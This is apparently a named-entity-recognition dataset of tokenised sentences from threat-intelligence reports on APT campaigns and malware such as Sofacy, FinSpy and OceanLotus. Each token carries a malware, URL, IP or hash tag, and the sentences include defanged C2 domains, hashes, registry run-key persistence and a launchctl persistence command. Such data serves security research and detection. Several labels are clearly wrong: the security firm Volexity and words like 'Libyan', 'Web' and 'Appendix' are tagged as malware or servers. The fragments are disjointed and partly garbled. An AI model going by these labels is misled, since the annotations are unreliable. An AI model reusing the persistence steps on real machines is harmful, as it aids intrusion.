ActiveX	O
controls	O
,	O
including	O
Flash	B-malware.backdoor
.	O

#	O
KCMDDC42F	O
#	O
-8900123456789	O
,	O
that	O
it	O
uses	O
for	O
securing	O
the	O
network	O
traffic	O
to	O
and	O
from	O
its	O
C	O
&	O
C	O
server	O
.	O

But	O
these	O
efforts	O
only	O
tell	O
a	O
portion	O
of	O
the	O
Sofacy	O
story	O
.	O

FindResource	O
(	O
)	O
,	O
LoadResource	O
(	O
)	O
,	O
etc	O
.	O

It	O
's	O
a	O
whopping	O
41	O
megabytes	O
.	O

'	O
Kraken	B-malware.ransom
HTTP	I-malware.ransom
'	O
is	O
sold	O
on	O
at	O
least	O
one	O
underground	O
market	O
as	O
a	O
commercial	O
product	O
.	O

As	O
mentioned	O
,	O
the	O
IP	O
addresses	O
in	O
use	O
have	O
belonged	O
to	O
mostly	O
US-based	O
hosting	O
services	O
...	O
at	O
least	O
recently	O
.	O

From	O
where	O
we	O
sit	O
,	O
2017	O
Sofacy	O
activity	O
starts	O
with	O
a	O
heavy	O
focus	O
on	O
NATO	O
and	O
Ukrainian	O
partners	O
,	O
coinciding	O
with	O
lighter	O
interest	O
in	O
Central	O
Asian	O
targets	O
,	O
and	O
finishing	O
the	O
second	O
half	O
of	O
the	O
year	O
with	O
a	O
heavy	O
focus	O
on	O
Central	O
Asian	O
targets	O
and	O
some	O
shift	O
further	O
East	O
.	O

Understanding	O
firewalls	O
–	O
When	O
anyone	O
or	O
anything	O
can	O
access	O
your	O
network	O
at	O
any	O
time	O
,	O
your	O
network	O
is	O
more	O
susceptible	O
to	O
being	O
attacked	O
.	O

Within	O
72	O
hours	O
,	O
they	O
were	O
on	O
a	O
private	O
jet	O
hired	O
by	O
the	O
Kazakh	O
embassy	O
,	O
and	O
taken	O
to	O
Almaty	O
,	O
Kazakhstan	O
's	O
capital	O
.	O

Japanese	O
Tech	O
Company	O
Taiwanese	O
Government	O
Organizations	O
Organizations	O
in	O
the	O
Asia-Pacific	O
Region	O
that	O
are	O
of	O
Interest	O
to	O
China	O
The	O
WATERSPOUT	B-malware.backdoor
backdoor	O
was	O
written	O
to	O
the	O
same	O
file	O
path	O
as	O
the	O
HIGHTIDE	B-malware.backdoor
backdoors	O
:	O
C	O
:	O
\DOCUMENTS	O
and	O
SETTINGS\	O
{	O
user	O
}	O
\LOCAL	O
SETTINGS\Temp\word.exe	O
C	O
:	O
\DOCUMENTS	O
and	O
SETTINGS\	O
{	O
user	O
}	O
\LOCAL	O
SETTINGS\Temp\winword.exe	O
WATERSPOUT	B-malware.backdoor
was	O
compiled	O
within	O
two	O
days	O
of	O
the	O
last	O
HIGHTIDE	B-malware.backdoor
backdoor	O
and	O
on	O
the	O
same	O
day	O
as	O
the	O
THREEBYTE	B-malware.backdoor
backdoor	O
.	O

In	O
this	O
case	O
Attackers	O
again	O
spoofed	O
an	O
email	O
id	O
associated	O
with	O
Indian	O
Ministry	O
of	O
Home	O
Affairs	O
and	O
the	O
mail	O
was	O
sent	O
on	O
September	O
1,2016	O
to	O
an	O
email	O
id	O
associated	O
Thailand	O
Indian	O
embassy	O
,	O
this	O
email	O
was	O
later	O
forwarded	O
on	O
Oct	O
24th,2016	O
from	O
a	O
spoofed	O
email	O
of	O
Thailand	O
Indian	O
embassy	O
to	O
various	O
email	O
recipients	O
connected	O
to	O
the	O
Indian	O
Ministry	O
of	O
External	O
Affairs	O
(	O
MEA	O
)	O
.	O

Persistence	O
Location	O
:	O

Rather	O
than	O
altering	O
its	O
activities	O
,	O
Cmstar	B-malware.unknown
only	O
notifies	O
the	O
C2	O
server	O
if	O
a	O
system	O
is	O
running	O
one	O
of	O
these	O
processes	O
,	O
suggesting	O
that	O
the	O
threat	O
actors	O
might	O
employ	O
this	O
technique	O
as	O
a	O
filtering	O
mechanism	O
to	O
ignore	O
analysis	O
systems	O
and	O
researchers	O
.	O

inocnation[.]com	B-url.unknown
mail.cbppnews[.]com	B-url.unknown

operas.exe	O
www.swgabeg[.]com	B-url.cncsvr
|	O
Port	O
1080	O
|	O
Clear	O
text	O
login	O
request	O
sent	O
to	O
controller	O
Dynamic	O
Appendix	B-url.cncsvr
A	O
–	O
IP	O
and	O
Domain	O
Listing	O

DragonOK	B-malware.infosteal
in	O
particular	O
is	O
known	O
to	O
frequently	O
use	O
this	O
implant	O
(	O
e.g.	O

We	O
monitored	O
the	O
filesystem	O
,	O
network	O
,	O
and	O
running	O
operating	O
system	O
of	O
the	O
infected	O
This	O
analysis	O
suggests	O
the	O
use	O
of	O
'	O
Finspy	B-malware.infosteal
'	O
,	O
part	O
of	O
the	O
commercial	O
intrusion	O
kit	O
,	O
Finfisher	B-malware.infosteal
,	O
distributed	O
by	O
Gamma	O
International	O
.	O

We	O
have	O
found	O
command	O
and	O
control	O
servers	O
for	O
FinSpy	B-malware.backdoor
backdoors	O
,	O
part	O
of	O
Gamma	O
International	O
's	O
FinFisher	B-malware.backdoor
'	O
remote	O
monitoring	O
solution	O
,	O
'	O
in	O
a	O
total	O
of	O
25	O
countries	O
:	O
Australia	O
,	O
Bahrain	O
,	O
Bangladesh	O
,	O
Brunei	O
,	O
Canada	O
,	O
Czech	O
Republic	O
,	O
Estonia	O
,	O
Ethiopia	O
,	O
Germany	O
,	O
India	O
,	O
Indonesia	O
,	O
Japan	O
,	O
Latvia	O
,	O
Malaysia	O
,	O
Mexico	O
,	O
Mongolia	O
,	O
Netherlands	O
,	O
Qatar	O
,	O
Serbia	O
,	O
Singapore	O
,	O
Turkmenistan	O
,	O
United	O
Arab	O
Emirates	O
,	O
United	O
Kingdom	O
,	O
United	O
States	O
,	O
Vietnam	O
.	O

Firewalls	O
can	O
be	O
configured	O
to	O
block	O
data	O
from	O
certain	O
locations	O
(	O
IP	O
whitelisting	O
)	O
or	O
applications	O
while	O
allowing	O
relevant	O
and	O
necessary	O
data	O
through	O
.	O

Standard	O
network	O
security	O
systems	O
typically	O
fail	O
against	O
what	O
are	O
known	O
as	O
'	O
zero-day	O
threats	B-malware.backdoor
.	O
'	O

T	O
he	O
anti-detection	O
launcher	O
and	O
decompressor	O
make	O
extensive	O
use	O
of	O
Metasploit	O
's	O
shikata_	O
ga_	O
nai	O
encoder	O
as	O
well	O
as	O
LZNT	O
1	O
compression	O
.	O

Follow	O
Up	O
#	O
1	O
Threat	O
Advisory	O
#	O
1011	O

23	O
,	O
2018	O
,	O
to	O
Feb	O
.	O

Meanwhile	O
,	O
Syrian	O
activists	O
continue	O
to	O
be	O
targeted	O
with	O
online	O
attacks	O
apparently	O
for	O
the	O
purposes	O
of	O
accessing	O
their	O
private	O
communications	O
and	O
stealing	O
their	O
secrets	O
.	O

We	O
located	O
multiple	O
variants	O
of	O
multiple-stage	O
droppers	O
and	O
payloads	O
in	O
the	O
last	O
few	O
months	O
,	O
and	O
although	O
they	O
are	O
not	O
really	O
packed	O
or	O
obfuscated	O
in	O
a	O
conventional	O
way	O
,	O
they	O
use	O
their	O
own	O
methods	O
and	O
tactics	O
of	O
obfuscation	O
and	O
distraction	O
.	O

Once	O
the	O
target	O
's	O
machine	O
is	O
compromised	O
,	O
the	O
attacker	O
first	O
enumerates	O
all	O
processes	O
running	O
in	O
the	O
system	O
and	O
all	O
services	O
.	O

The	O
first	O
time	O
the	O
RAT	B-malware.backdoor
runs	O
,	O
it	O
will	O
copy	O
the	O
reflective	O
loader	O
,	O
named	O
'	O
kernel.dll	O
'	O
to	O
one	O
of	O
Windows	O
'	O
common	O
folders	O
and	O
will	O
create	O
a	O
registry	O
key	O
named	O
{	B-hash
0355F5D0-467C-30E9-894C-C2FAEF522A13	I-hash
}	I-hash
under	O
'	O
SOFTWARE\Microsoft\Windows\CurrentVersion\Run	O
'	O
with	O
the	O
value	O
of	O
'	O
C:\Windows\System32\rundll32.exe	O
'	O
\	O
%	O
LOCATION%\kernel.dll	O
'	O
_dec	O
'	O
to	O
rerun	O
the	O
injection	O
routine	O
after	O
each	O
boot	O
.	O

This	O
section	O
contains	O
the	O
details	O
of	O
the	O
C2	O
domain	O
(	O
tripleshop[.]id	B-url.cncsvr
)	O
.	O

We	O
acknowledge	O
that	O
IRONGATE	B-malware.backdoor
could	O
be	O
a	O
test	O
case	O
,	O
proof	O
of	O
concept	O
,	O
or	O
research	O
activity	O
for	O
ICS	O
attack	O
techniques	O
.	O

The	O
shellcode	O
used	O
is	O
the	O
same	O
for	O
every	O
stage	O
that	O
uses	O
shellcode	O

Before	O
the	O
malware	O
can	O
be	O
installed	O
a	O
unique	O
name	O
must	O
to	O
be	O
generated	O
for	O
the	O
service	O
.	O

Identifying	O
today	O
's	O
threats	O
requires	O
multiple	O
layers	O
of	O
protection	O
at	O
various	O
points	O
across	O
the	O
network	O
,	O
along	O
with	O
constantly	O
updated	O
threat	O
intelligence	O
information	O
.	O

Browser	O
plugin	O
:	O
Used	O
to	O
steal	O
browser	O
history	O
,	O
stored	O
passwords	O
and	O
sessions	O
.	O

Assistance	O
from	O
Seth	O
Hardy	O
and	O
Harry	O
Tuttle	O
gratefully	O
received	O
.	O

A	O
public	O
report	O
released	O
here	O
documented	O
a	O
similar	O
case	O
in	O
which	O
several	O
universities	O
were	O
targeted	O
by	O
an	O
email	O
purporting	O
to	O
be	O
from	O
The	O
Japanese	O
Society	O
for	O
the	O
Promotion	O
of	O
Science	O
'	O
jsps(.)go(.)jp	O
'	O
regarding	O
the	O
need	O
to	O
renew	O
grant	O
funding	O
.	O

While	O
Volexity	B-malware.backdoor
has	O
only	O
observed	O
a	O
handful	O
of	O
the	O
hostnames	O
in	O
the	O
wild	O
thus	O
far	O
,	O
other	O
active	O
subdomains	O
suggest	O
there	O
could	O
be	O
additional	O
on-going	O
exploit	O
or	O
malware	O
activity	O
from	O
the	O
domain	O
.	O

Command	O
and	O
Control	O
Server	O

14	O
Sept	O
.	O

In	O
those	O
binaries	O
the	O
file	O
system	O
serves	O
to	O
set	O
the	O
persistence	O
of	O
the	O
payload	O
.	O

The	O
statistics	O
do	O
not	O
necessarily	O
reflect	O
the	O
exact	O
distribution	O
of	O
targets	O
:	O
one	O
target	O
may	O
click	O
more	O
than	O
one	O
time	O
;	O
a	O
proxy	O
or	O
VPN	O
may	O
skew	O
the	O
country	O
count	O
;	O
and	O
security	O
researchers	O
and	O
bots	O
may	O
also	O
comprise	O
part	O
of	O
the	O
clicks	O
.	O

During	O
our	O
analysis	O
,	O
though	O
,	O
the	O
download	O
link	O
for	O
the	O
decoy	O
document	O
was	O
already	O
down	O
.	O

Until	O
recently	O
it	O
was	O
unclear	O
what	O
the	O
purpose	O
of	O
this	O
file	O
was	O
,	O
but	O
popular	O
opinion	O
held	O
that	O
it	O
was	O
related	O
to	O
Stuxnet	B-malware.backdoor
.	O

The	O
targeting	O
of	O
private	O
sector	O
interests	O
by	O
APT32	B-malware.infosteal
is	O
notable	O
and	O
FireEye	O
believes	O
the	O
actor	O
poses	O
significant	O
risk	O
to	O
companies	O
doing	O
business	O
in	O
,	O
or	O
preparing	O
to	O
invest	O
in	O
,	O
the	O
country	O
.	O

(	O
where	O
?	O
?	O
?	O

If	O
the	O
format	O
entered	O
is	O
correct	O
,	O
the	O
user	O
is	O
then	O
asked	O
to	O
fill	O
in	O
more	O
details	O
including	O
address	O
,	O
phone	O
number	O
,	O
etc..	O

Figure	O
4	O
:	O

00000032	O
AA	O
43	O
C5	O
86	O
C6	O
FD	O
5B	O
ED	O
CE	O
BE	O
6C	O
D8	O
42	O
B4	O
aCÅ†Æ	O
ý	O
[	O
íÎ	O
3⁄4	O
lØB	O
́	O

Launcher	O
generateRandomPathAndName	O
]	O

Immediately	O
,	O
root9B	O
identified	O
that	O
preparations	O
were	O
being	O
made	O
for	O
a	O
larger	O
scale	O
attack	O
similar	O
to	O
previous	O
Sofacy	B-malware.backdoor
attributed	O
exploits	O
,	O
and	O
the	O
attack	O
was	O
still	O
in	O
the	O
preparatory	O
stages	O
.	O

DROPPER	O
IMPLANT	O

At	O
that	O
time	O
,	O
ChessMaster	O
was	O
using	O
ANEL	B-malware.backdoor
as	O
a	O
backdoor	O
into	O
the	O
target	O
system	O
then	O
injects	O
code	O
into	O
svchost.exe	O
,	O
which	O
then	O
decrypts	O
and	O
activates	O
the	O
embedded	O
backdoor	O
.	O

In	O
the	O
case	O
of	O
the	O
crypto	O
password	O
,	O
the	O
name	O
of	O
the	O
resource	O
is	O
PWD	O
.	O

The	O
upload	O
server	O
component	O
–	O
'	O
up.pzchao	B-url.unknown
'	O

This	O
was	O
necessary	O
to	O
get	O
around	O
some	O
of	O
the	O
ways	O
that	O
findstr	O
interprets	O
regex	O
.	O

Resolving	O
the	O
hostname	O
gives	O
:	O
41.208.110.46	B-ip.unknown
which	O
is	O
a	O
static	O
Libyan	B-malware.infosteal
IP	O
address	O
owned	O
by	O
Libya	O
Telecom	O
and	O
Technology	O
Backbone.Going	O
back	O
to	O
the	O
domain/hostname	O
used	O
by	O
the	O
Libyan	B-malware.infosteal
Scorpions	I-malware.infosteal
hacking	O
group	O
,	O
it	O
appears	O
that	O
myq-see.com	B-url.unknown
is	O
a	O
dynamic	O
DNS	O
service	O
open	O
for	O
the	O
public	O
.	O

SOC	O
analysts	O
and	O
engineers	O
can	O
use	O
this	O
threat	O
analysis	O
detailed	O
information	O
pertaining	O
to	O
the	O
workings	O
of	O
a	O
malware	O
family	O
and	O
indicators	O
of	O
compromise	O
(	O
IoCs	O
)	O
to	O
contain	O
or	O
mitigate	O
the	O
discussed	O
threat	O
through	O
monitoring	O
or	O
blocking	O
.	O

In	O
the	O
malicious	O
code	O
,	O
the	O
above	O
function	O
is	O
mainly	O
used	O
to	O
read	O
the	O
data	O
of	O
the	O
memory	O
address	O
specified	O
by	O
the	O
parameter	O
.	O

After	O
understanding	O
the	O
logic	O
&	O
to	O
satisfy	O
the	O
condition	O
the	O
environment	O
was	O
configured	O
to	O
give	O
proper	O
response	O
when	O
the	O
malware	O
made	O
a	O
request	O
to	O
JobTcp1.php	O
or	O
JobTcp2.php	O
.	O

Their	O
tools	O
are	O
consistently	O
designed	O
to	O
function	O
on	O
English	O
and	O
Portuguese	O
systems	O
spanning	O
the	O
gamut	O
of	O
Windows	O
OS	O
,	O
and	O
their	O
exfiltration	O
methods	O
include	O
the	O
use	O
of	O
hijacked	O
satellite	O
connections	O
.	O

The	O
headquarters	O
component	O
(	O
netsat.exe	O
)	O
logs	O
certain	O
events	O
in	O
a	O
file	O
located	O
at	O
CSIDL_MYPICTURES\wins	O
.	O

Scheduled	O
task	O
1	O
:	O
Downloads	O
a	O
COM	O
scriptlet	O
that	O
redirects	O
to	O
Cobalt	O
Strike	O
payload	O
:	O

Once	O
the	O
'	O
Login	O
'	O
record	O
is	O
found	O
,	O
the	O
malware	O
sends	O
a	O
GET	O
request	O
to	O
the	O
remote	O
C	O
&	O
C	O
.	O

The	O
malware	O
employs	O
a	O
myriad	O
of	O
techniques	O
designed	O
to	O
evade	O
detection	O
and	O
frustrate	O
analysis	O
.	O

Module	O
Name	O

Password	O
achievement	O
is	O
done	O
via	O
a	O
Mimikatz	B-malware.unknown
implementation	O
downloaded	O
along	O
with	O
the	O
rest	O
of	O
the	O
fi	O
les	O
.	O

Volexity	B-malware.backdoor
refers	O
to	O
this	O
shell	O
as	O
the	O
Angel	O
Webshell	O
,	O
named	O
after	O
its	O
default	O
password	O
of	O
â	O
€	O
œangelâ	O
€	O
.	O

Throughout	O
April	O
,	O
Iran	O
's	O
CSRI	O
simultaneously	O
demonstrated	O
an	O
increased	O
interest	O
in	O
the	O
Philippine	O
Department	O
of	O
Science	O
&	O
Technology	O
(	O
DOST	O
)	O
.	O

*JE	O
&	O
!	O
M	O
@	O
UNQ	O
@	O
--	O
--	O
--	O
FormBoundary	O
<	O
randomly_generated_characters	O
>	O
Content-Disposition	O
:	O
form-data	O
;	O
name='file1	O
'	O
;	O
filename='king.jpg	O
'	O
Content-Type	O
:	O
application/octet-stream	O
board_id	O
is	O
a	O
four-digit	O
number	O
that	O
may	O
be	O
an	O
identifier	O
for	O
a	O
campaign	O
ID	O
.	O

@	O
@	O
00	O
ferry	O
0	O
dir	O
5	O

seen	O
2012	O
03	O
14	O
14:21:10	O
0000	O
1first	O
seen	O
2013	O
02	O
26	O
22:04:07	O
0000	O
2last3	O
news.grouptumbler.com	O
.	O

decoded	O
base64	O
Mimikatz	B-malware.unknown
payload	O

Decoy	O
document	O
shown	O
to	O
victims	O

개요	O
............................................................................................................................................................................................	O
3	O
공격	O
방식	O
(	O
Infection	O
Vector	O
)	O
............................................................................................................................................	O
4	O
1	O
.	O

Property	O
list	O
with	O
persistence	O
settings	O
launchctl	O
load	O
/Library/LaunchDaemons/filename.plist	O
>	O
/dev/nul	O
or	O
launchctl	O
load	O
~/Library/LaunchAgents/	O
filename.plist	O
>	O
/dev/nul	O
will	O
then	O
command	O
the	O
operating	O
system	O
to	O
start	O
the	O
dropped	O
backdoor	O
file	O
at	O
login	O
.	O

Flash	O
Cluster	O
(	O
aka	O
Cluster	O
1	O
)	O

The	O
third	O
section	O
of	O
the	O
PowerShell	O
script	O
is	O
the	O
biggest	O
section	O
and	O
has	O
a	O
wide	O
variety	O
of	O
functionalities	O
.	O

McAfee	O
Email	O
and	O
Web	O
Security	O
Appliances.TrustedSource	O
has	O
coverage	O
for	O
domains	O
and	O
IP	O
addresses	O
that	O
the	O
malware	O
contacts	O
.	O

It	O
is	O
available	O
on	O
GitHub	O
:	O
https://github.com/wso-shell/WSOT	B-url.normal
wo	O
of	O
the	O
PHP	O
scripts	O
found	O
,	O
ini.php	O
and	O
mysql.php	O
,	O
contained	O
a	O
WSO	B-malware.backdoor
shell	O
concatenated	O
with	O
the	O
following	O
email	O
spamming	O
script	O
:	O
https://github.com/bediger4000/php-malware-analysis/tree/master/db-config.php	B-url.normal
All	O
the	O
scripts	O
found	O
are	O
obfuscated	O
.	O

Ukraine	O
's	O
Parliament	O
UKR	O
Pres	O
.	O

Attack	O
Methodology	O
...........................................................................................................................................................................................................................................................................................................	O
4	O
Attack	O
vector	O
..........................................................................................................................................................................................................................................................................................................................	O
4	O
Decoy	O
Behavior	O
................................................................................................................................................................................................................................................................................................................	O
4	O
Evasion	O
Techniques	O
................................................................................................................................................................................................................................................................................................	O
5	O
CPU	O
Core	O
Check	O
............................................................................................................................................................................................................................................................................................................	O
5	O
Password	O
Protected	O
Documents	O
........................................................................................................................................................................................................................................	O
7	O
Large	O
files	O
.........................................................................................................................................................................................................................................................................................................................................	O
8	O

In	O
particular	O
,	O
all	O
Dino	B-malware.backdoor
's	O
modules	O
store	O
their	O
content	O
inside	O
this	O
structure	O
,	O
making	O
its	O
understanding	O
one	O
of	O
the	O
keys	O
to	O
analyzing	O
Dino	B-malware.backdoor
.	O

File	O
name	O
SHA-1	O
hash	O

The	O
shellcode	O
is	O
a	O
custom	O
PE	O
loader	O
.	O

A	O
remote	O
administrator	O
can	O
install	O
or	O
remove	O
apps	O
,	O
install	O
or	O
revoke	O
certificates	O
,	O
lock	O
the	O
device	O
,	O
or	O
change	O
password	O
requirements	O
,	O
among	O
other	O
things	O
.	O

In	O
an	O
older	O
version	O
of	O
the	O
customized	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
malware	O
,	O
the	O
protocol	O
packet	O
flag	O
is	O
no	O
longer	O
represented	O
by	O
the	O
string	O
'	O
Gh0st	B-malware.backdoor
'	O
.	O

The	O
attacker	O
deployed	O
an	O
open-source	O
mobile	O
device	O
management	O
(	O
MDM	B-malware.infosteal
)	O
system	O
to	O
control	O
enrolled	O
devices	O
.	O

Execute	O
the	O
Implant	O
DLL	O
Payload	O
file	O
Figure	O
10	O
-	O
Unicode	O
String	O
Stacking	O
then	O
XOR	O
deobfuscation	O
of	O
the	O
User-Agent	O
String	O
Analysis	O
of	O
the	O
malicious	O
payload	O
DLL	O
reveals	O
that	O
the	O
malware	O
was	O
using	O
a	O
string	O
stacking	O
technique	O
that	O
moves	O
four	O
bytes	O
of	O
a	O
Unicode	O
string	O
at	O
a	O
time	O
into	O
memory	O
.	O

Trend	O
Micro	O
monitors	O
the	O
targeted	O
attack	O
landscape	O
in	O
order	O
to	O
identify	O
ongoing	O
campaigns	O
and	O
provide	O
additional	O
threat	O
intelligence	O
useful	O
for	O
identifying	O
the	O
existence	O
of	O
these	O
campaigns	O
in	O
an	O
enterprise	O
network	O
.	O

Ssl[.]arkouthrie[.]com	B-url.cncsvr
s3[.]hiahornber[.]com	B-url.cncsvr
widget[.]shoreoa[.]com	B-url.cncsvr
Delivery	O
document	O
(	O
W2KM_OCEANLOTUS.A	O
)	O
:	O
2bb855dc5d845eb5f2466d7186f150c172da737bfd9c7f6bc1804e0b8d20f22a	B-hash
4da8365241c6b028a13b82d852c4f0155eb3d902782c6a538ac007a44a7d61b4	B-hash
Dropper	O
(	O
OSX_OCEANLOTUS.D	O
)	O
:	O
673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f	B-hash
Backdoor	O
(	O
OSX_OCEANLOTUS.D	O
)	O
:	O
ENTERPRISE	O
SMALL	O
BUSINESS	O
HOME	O

cores	O
in	O
the	O
running	O
environment	O
,	O
by	O
calling	O
the	O
'	O
GetSystemInfo	O
'	O
API	O
,	O
which	O
returns	O
a	O
structure	O
with	O
system	O
data	O
,	O
including	O
number	O
of	O
cores	O
.	O

ZwContinue	O
function	O
.	O

From	O
an	O
analyst	O
's	O
perspective	O
,	O
it	O
is	O
unclear	O
whether	O
these	O
actors	O
choose	O
to	O
use	O
this	O
type	O
of	O
malware	O
simply	O
out	O
of	O
convenience	O
or	O
in	O
a	O
deliberate	O
effort	O
to	O
blend	O
in	O
with	O
traditional	O
cybercrime	O
groups	O
,	O
who	O
also	O
use	O
these	O
same	O
tools	O
.	O

This	O
implant	O
also	O
contains	O
functionality	O
to	O
wipe	O
files	O
and	O
content	O
from	O
the	O
targeted	O
system	O
to	O
erase	O
evidence	O
or	O
perform	O
other	O
destructive	O
actions	O
.	O

The	O
main	O
backdoor	O
component	O
is	O
found	O
in	O
winsocks.exe	B-malware.backdoor
.	O

Broadly	O
,	O
the	O
ScanBox	B-malware.infosteal
framework	O
codebase	O
has	O
remained	O
the	O
same	O
,	O
however	O
there	O
are	O
slight	O
nuances	O
in	O
some	O
aspects	O
of	O
the	O
code	O
,	O
or	O
in	O
the	O
software	O
attackers	O
choose	O
to	O
search	O
for	O
.	O

The	O
malware	O
calls	O
ZwQueryInformationProcess	O
with	O
ThreadInformationClass	O
set	O
to	O
0x	O
(	O
ProcessDebugPort	O
)	O
and	O
0x1e	O
(	O
ProcessDebugObjectHandle	O
)	O
to	O
detect	O
the	O
presence	O
of	O
a	O
debugger	O
.	O

GET	O
/login.asp	O
?	O

#	O
runhfcore-	O
starts	O
the	O
main	O
PI	O
backdoor	O
functionality	O
in	O
a	O
separate	O
thread	O

Projects	O
:	O

Figure	O
3	O
.	O

The	O
set	O
of	O
targets	O
cover	O
all	O
aspects	O
of	O
unmanned	O
vehicles	O
,	O
land	O
,	O
air	O
,	O
and	O
sea	O
,	O
from	O
research	O
to	O
design	O
to	O
manufacturing	O
of	O
the	O
vehicles	O
and	O
their	O
various	O
subsystems	O
.	O

The	O
malware	O
is	O
designed	O
to	O
function	O
specifically	O
on	O
English	O
and	O
Portuguese­language	O
systems	O
.	O

This	O
OS	O
and	O
application	O
flexibility	O
make	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
an	O
even	O
more	O
dangerous	O
Web	B-malware.ransom
shell	O
.	O

Browser	O
Data	O
Collector	O
:	O
Used	O
to	O
steal	O
passwords	O
and	O
other	O
sensitive	O
information	O
stored	O
in	O
browsers	O
.	O

Chafer	O
has	O
been	O
active	O
since	O
at	O
least	O
July	O
2014	O
and	O
its	O
activities	O
were	O
 rst	O
exposed	O
by	O
Symantec	O
in	O
December	O
2015	O
(	O
https://www.symantec.com/connect/blogs/iran-based-attackers-use-back-door-threats-spy-middle-eastern-targets	B-url.normal
)	O
,	O
when	O
it	O
was	O
found	O
to	O
be	O
conducting	O
targeted	O
surveillance	O
of	O
domestic	O
and	O
international	O
targets	O
.	O

However	O
,	O
they	O
did	O
not	O
take	O
any	O
time	O
at	O
all	O
to	O
attempt	O
to	O
obfuscate	O
their	O
.NET	O
code	O
.	O

The	O
images	O
below	O
display	O
this	O
username	O
in	O
the	O
samples	O
metadata	O
:	O

However	O
,	O
this	O
turned	O
out	O
to	O
be	O
only	O
a	O
brief	O
hiatus	O
and	O
,	O
by	O
April	O
2015	O
,	O
there	O
had	O
been	O
a	O
resurgence	O
in	O
activity	O
.	O

Are	O
there	O
multiple	O
variants	O
of	O
the	O
Poseidon	B-malware.infosteal
Group	O
's	O
malware	O
?	O

Given	O
our	O
love	O
for	O
unsolved	O
mysteries	O
,	O
we	O
jumped	O
right	O
on	O
it	O
.	O

Agent.RUI	O

These	O
technical	O
indicators	O
,	O
combined	O
with	O
context	O
of	O
an	O
incident	O
(	O
such	O
as	O
the	O
timing	O
,	O
specificity	O
and	O
human	O
activity	O
)	O
allow	O
analysts	O
to	O
assess	O
the	O
targeted	O
or	O
non-targeted	O
nature	O
of	O
the	O
threat	O
.	O

In	O
April	O
2015	O
,	O
alleged	O
pro-ISIS	O
hacktivist	O
group	O
CyberCaliphate	B-malware.infosteal
defaced	O
TV5Monde	O
's	O
websites	O
and	O
social	O
media	O
profiles	O
and	O
forced	O
the	O
company	O
's	O
11	O
broadcast	O
channels	O
offline	O
.	O

and	O
pertains	O
to	O
ALYac	O
,	O
Korean	O
anti-virus	O
software	O
.	O

In	O
addition	O
,	O
the	O
newer	O
malware	O
strain	O
has	O
stronger	O
capabilities	O
and	O
a	O
wider	O
functionality	O
than	O
the	O
older	O
one	O
,	O
which	O
would	O
only	O
send	O
information	O
about	O
the	O
system	O
version	O
.	O

Both	O
types	O
provide	O
basic	O
RAT	B-malware.backdoor
functionality	O
with	O
the	O
distinction	O
between	O
the	O
two	O
being	O
largely	O
the	O
directionality	O
of	O
the	O
communication	O
.	O

Image	O
2	O
.	O

Extracted	O
URL	O
Analysis	O

Dropper	O
packages	O
that	O
installs	O
both	O
Epic	B-malware.backdoor
and	O
Turla	O
Carbon	B-malware.backdoor
system	O
:	O

The	O
samples	O
share	O
the	O
same	O
driverw.sys	O
file	O
,	O
SHA-256	O
:	O
62bde3bac3782d36f9f2e56db097a4672e70463e11971fad5de060b191efb196	B-hash
.	O

Yara	O
Signature	O

Upon	O
reviewing	O
the	O
traffic	O
from	O
these	O
IPs	O
,	O
some	O
traffic	O
may	O
correspond	O
to	O
malicious	O
activity	O
,	O
and	O
some	O
may	O
correspond	O
to	O
legitimate	O
activity	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
HTTP	O
connection	O
made	O
to	O
those	O
IP	O
addresses	O
.	O

75D3D1F23628122A64A2F1B7EF33F5CF	B-hash
D9821468315CCD3B9EA03161566EF18E	B-hash
B9AF5F5FD434A65D7AA1B55F5441C90A	B-hash
RAT	O
Implant/Payload	O
RAT	B-malware.backdoor
Implant/Payload	O
RAT	B-malware.backdoor
Implant/Payload	O
OLE	O
Control	O
Library	O
(	O
DLL	O
)	O
OLE	O
Control	O
Library	O
(	O
DLL	O
)	O
OLE	O
Control	O
Library	O
(	O
DLL	O
)	O
The	O
first	O
two	O
DLLs	O
beacon	O
to	O
inocnation[.]com	B-url.unknown
.	O

Attackers	O
in	O
this	O
case	O
made	O
every	O
attempt	O
to	O
launch	O
a	O
clever	O
attack	O
campaign	O
by	O
impersonating	O
the	O
identity	O
of	O
highly	O
influential	O
Indian	O
Think	O
tank	O
to	O
target	O
Indian	O
investigative	O
agency	O
and	O
the	O
officials	O
of	O
the	O
Indian	O
army	O
by	O
using	O
an	O
email	O
theme	O
relevant	O
to	O
the	O
targets	O
.	O

Unidentified	O
versions	O
are	O
marked	O
as	O
'	O
not	O
support	O
this	O
version	O
of	O
Windows	O
'	O
.	O

We	O
would	O
like	O
to	O
thank	O
Ronghwa	O
Chong	O
,	O
Nart	O
Villeneuve	O
,	O
Darien	O
Kindlund	O
,	O
Kenneth	O
Gears	O
and	O
Jonathan	O
Wrolstad	O
for	O
their	O
insight	O
,	O
research	O
and	O
support	O
.	O

Mabna	O
Institute	O

We	O
found	O
one	O
file	O
which	O
matched	O
the	O
reports	O
:	O
This	O
is	O
an	O
executable	O
file	O
,	O
but	O
the	O
icon	O
looks	O
like	O
a	O
document	O
icon	O
,	O
and	O
the	O
very	O
long	O
name	O
makes	O
the	O
*.scr	O
extension	O
hard	O
to	O
spot	O
-	O
particularly	O
if	O
the	O
executable	O
comes	O
packaged	O
in	O
an	O
archive	O
,	O
as	O
was	O
reportedly	O
the	O
case	O
here	O
.	O

0x000000FF	O
in	O
ascending	O
order	O
:	O
Index	O
ESI	O

The	O
first	O
named	O
scheduled	O
task	O
launched	O
an	O
application	O
whitelisting	O
script	O
protection	O
bypass	O
to	O
execute	O
a	O
COM	O
scriptlet	O
that	O
dynamically	O
downloaded	O
the	O
first	O
backdoor	O
from	O
APT32	B-malware.infosteal
's	O
infrastructure	O
and	O
injected	O
it	O
into	O
memory	O
.	O

If	O
the	O
controller	O
was	O
in	O
a	O
running	O
state	O
,	O
trilog.exe	O
encoded	O
the	O
two	O
payload	O
files	O
inject.bin	O
and	O
imain.bin	O
and	O
passed	O
them	O
to	O
the	O
communication	O
libraries	O
to	O
be	O
appended	O
to	O
the	O
controller	O
's	O
program	O
memory	O
and	O
execution	O
table	O
.	O

SHA256	O
:	O
239a25ac2b38f0be9392ceeaeab0d64cb239f033af07ed56565ba9d6a7ddcf1f	B-hash
C2	O
:	O
links.dogsforhelp.com	B-url.unknown
SHA256	O
:	O
